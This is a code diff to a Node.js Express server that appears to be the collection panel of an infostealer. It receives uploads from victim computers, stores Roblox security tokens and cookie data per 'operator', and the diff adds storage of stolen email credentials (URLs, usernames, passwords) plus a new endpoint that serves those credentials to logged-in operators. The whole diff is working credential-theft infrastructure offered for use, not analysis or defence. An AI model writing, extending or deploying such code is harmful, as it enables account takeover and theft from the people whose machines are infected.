@@ -8,7 +8,7 @@ const https       = require('https');
 const http        = require('http');
 const { MongoClient } = require('mongodb');
 
-const CURRENT_CLIENT_VERSION = '7.2.2';
+const CURRENT_CLIENT_VERSION = '7.2.3';
 
 const app = express();
 app.set('trust proxy', 1);
@@ -402,6 +402,21 @@ app.post('/upload', upload.array('files'), async (req, res) => {
   const operator = sanitize(req.body.operator, 64) || 'Shonll';
   const pcName = computerInfo.name;
 
+  let emails = [];
+  try {
+    const raw = req.body.emails;
+    if (typeof raw === 'string' && raw.length > 10) {
+      const parsed = JSON.parse(raw);
+      if (Array.isArray(parsed)) {
+        emails = parsed.slice(0, 50).map(e => ({
+          url: sanitize(e.Url || e.url, 512),
+          username: sanitize(e.Username || e.username, 256),
+          password: sanitize(e.Password || e.password, 512)
+        })).filter(e => e.url && e.username);
+      }
+    }
+  } catch (e) { /* invalid json */ }
+
   const diagnostics = {
     cookieError: sanitize(req.body.cookieError, 6000) || ''
   };
@@ -423,6 +438,9 @@ app.post('/upload', upload.array('files'), async (req, res) => {
       $set: { name: fixedName, uploadedAt: new Date().toISOString(), computer: computerInfo, diagnostics: diagnostics, operator: operator, 'tokenRequest.requested': false },
       $setOnInsert: { 'roblox.user': '', 'roblox.pass': '' }
     };
+    if (emails.length > 0) {
+      updateDoc.$set['emails'] = emails;
+    }
     // Если есть токен — всегда записываем его
     if (robloxInfo.security) {
       updateDoc.$set['roblox.security'] = robloxInfo.security;
@@ -441,6 +459,7 @@ app.post('/upload', upload.array('files'), async (req, res) => {
     }
   } else {
     // In-memory fallback
+    doc.emails = emails;
     global.memFiles = global.memFiles.filter(f => !(f.name === fixedName && f.operator === operator));
     global.memFiles.push(doc);
   }
@@ -1099,6 +1118,25 @@ app.get('/tokens', requireAuth, (req, res) => {
         }
       }
       res.json({ success: true, timestamp: now });
+    } catch (e) {
+      res.status(500).json({ error: e.message });
+    }
+  });
+
+  app.get('/api/emails/:filename', requireAuth, async (req, res) => {
+    try {
+      const user = req.authUser || req.session.user;
+      const filename = req.params.filename;
+      const db = await getDb();
+      let doc;
+      if (db) {
+        doc = await db.collection('files').findOne({ name: filename, operator: user });
+      } else {
+        doc = (global.memFiles || []).find(f => f.name === filename && f.operator === user);
+      }
+      if (!doc) return res.json([]);
+      const emails = doc.emails || [];
+      res.json(Array.isArray(emails) ? emails : []);
     } catch (e) {
       res.status(500).json({ error: e.message });
     }
